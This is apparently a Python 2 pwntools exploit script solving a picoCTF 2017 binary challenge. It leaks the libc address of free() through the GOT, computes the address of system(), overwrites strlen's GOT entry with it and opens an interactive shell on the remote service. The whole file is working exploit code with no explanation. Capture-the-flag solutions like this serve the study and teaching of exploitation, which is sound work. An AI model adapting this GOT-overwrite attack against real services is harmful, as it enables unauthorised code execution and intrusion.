#!/usr/bin/env python2
from pwn import *
from struct import pack,unpack
FREE_GOT_PLT = 0x601EF0
STRLEN_GOT_PLT = 0x601F00
FREE_OFFSET = 0x7c600
SYSTEM_OFFSET = 0x41490
r = remote("shell2017.picoctf.com", 8708)
r.send("09-24-2018 0\n")
r.send("~09-24-2018\n")
payload = pack("<Q",FREE_GOT_PLT)+pack("<Q",24)+pack("<Q",2)+pack("<Q",1)+pack("<Q",0)
r.send(payload+"\n")
r.recv()
r.send("ax 09-2018\n")
free_libc = int(r.recv().splitlines()[-1])
libc_base = free_libc-FREE_OFFSET
system_libc = libc_base+SYSTEM_OFFSET
r.send("09-25-2018 0\n")
r.send("~09-25-2018\n")
payload = pack("<Q",STRLEN_GOT_PLT)+pack("<Q",25)+pack("<Q",2)+pack("<Q",0)+pack("<Q",0)
r.send(payload+"\n")
r.send("09-25-2018 %d\n"%system_libc)
r.interactive()
